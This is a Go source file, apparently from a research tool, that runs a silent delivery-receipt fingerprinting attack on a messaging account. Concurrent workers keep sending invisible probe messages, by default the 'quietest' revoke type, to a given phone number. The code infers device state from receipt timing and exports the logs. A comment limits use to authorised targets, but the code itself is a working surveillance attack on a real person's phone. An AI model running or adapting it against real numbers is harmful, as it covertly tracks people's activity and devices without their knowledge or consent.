// Package runner drives the live delivery-receipt fingerprint against an
// authorised target.
//
// RESEARCH USE ONLY. The runner sends a continuous stream of silent probe
// messages to a real phone number and infers device state from receipt timing.
// Only run it against devices and accounts you own or are explicitly
// authorised to test.
package runner

import (
	"context"
	"sync"
	"time"

	"github.com/ctrlsam/careless-whisper-go/internal/analyzer"
	"github.com/ctrlsam/careless-whisper-go/internal/collector"
	"github.com/ctrlsam/careless-whisper-go/internal/exporter"
	"github.com/ctrlsam/careless-whisper-go/internal/messenger"
	"github.com/ctrlsam/careless-whisper-go/internal/model"
)

// Settings configures a fingerprint run.
type Settings struct {
	PhoneNumber        string
	ConcurrentWorkers  int
	DelayBetween       time.Duration
	IgnoreUnregistered bool
	// ProbeKind selects the silent-probe primitive. The zero value defaults to
	// ProbeRevoke, the quietest candidate.
	ProbeKind messenger.ProbeKind
}

func (s Settings) withDefaults() Settings {
	if s.ConcurrentWorkers <= 0 {
		s.ConcurrentWorkers = 5
	}
	if s.DelayBetween <= 0 {
		s.DelayBetween = time.Second
	}
	if s.ProbeKind == "" {
		s.ProbeKind = messenger.ProbeRevoke
	}
	return s
}

// effectivePingInterval mirrors the Python runner: the per-message cadence once
// concurrency is accounted for.
func (s Settings) effectivePingInterval() time.Duration {
	workers := s.ConcurrentWorkers
	if workers < 1 {
		workers = 1
	}
	return time.Duration(int64(s.DelayBetween) / int64(workers))
}

// Observer receives live progress during a fingerprint run.
type Observer interface {
	OnReport(model.ReceiptReport)
	OnAnalysis(model.Analysis)
	Info(string)
	Warn(string)
}

// Run executes the fingerprint until ctx is cancelled.
func Run(ctx context.Context, m messenger.Messenger, settings Settings, exp exporter.Exporter, observer Observer) error {
	settings = settings.withDefaults()

	warn := func(string) {}
	if observer != nil {
		warn = observer.Warn
	}
	if err := messenger.ConfirmNumber(ctx, m, settings.PhoneNumber, settings.IgnoreUnregistered, warn); err != nil {
		return err
	}

	tracker := collector.NewTracker(settings.PhoneNumber)
	pingInterval := settings.effectivePingInterval()

	var publishMu sync.Mutex
	publish := func() {
		publishMu.Lock()
		defer publishMu.Unlock()
		analysis := analyzer.Analyze(tracker.Capture(), analyzer.Options{PingInterval: pingInterval})
		if exp != nil {
			_ = exp.SaveAnalysis(analysis)
		}
		if observer != nil {
			observer.OnAnalysis(analysis)
		}
	}

	handleReport := func(report *model.ReceiptReport) {
		if report == nil {
			return
		}
		if exp != nil {
			_ = exp.SaveReport(*report)
		}
		if observer != nil {
			observer.OnReport(*report)
		}
		publish()
	}

	m.SetReceiptTarget(settings.PhoneNumber)
	m.SetDeliveryCallback(func(msgID string) {
		handleReport(tracker.RecordDelivery(msgID, time.Now()))
	})
	m.SetReceiptCallback(func(event model.ReceiptEvent) {
		tracker.ObserveReceipt(event)
		if exp != nil {
			_ = exp.SaveReceiptEvent(event)
		}
		publish()
	})
	m.SetSentMessageCallback(func(message model.SentMessage) {
		tracker.ObserveSentMessage(message)
		if exp != nil {
			_ = exp.SaveSentMessage(message)
		}
		publish()
	})

	var wg sync.WaitGroup
	worker := func() {
		defer wg.Done()
		for ctx.Err() == nil {
			sentAt := time.Now()
			msgID, err := m.SendSilentMessage(ctx, settings.PhoneNumber, "", messenger.SendOptions{ProbeKind: settings.ProbeKind})
			if err != nil {
				if ctx.Err() != nil {
					return
				}
				if observer != nil {
					observer.Warn("silent probe failed: " + err.Error())
				}
				continue
			}
			handleReport(tracker.TrackMessage(msgID, sentAt))
			select {
			case <-ctx.Done():
				return
			case <-time.After(settings.DelayBetween):
			}
		}
	}

	for i := 0; i < settings.ConcurrentWorkers; i++ {
		wg.Add(1)
		go worker()
	}
	wg.Wait()
	return ctx.Err()
}
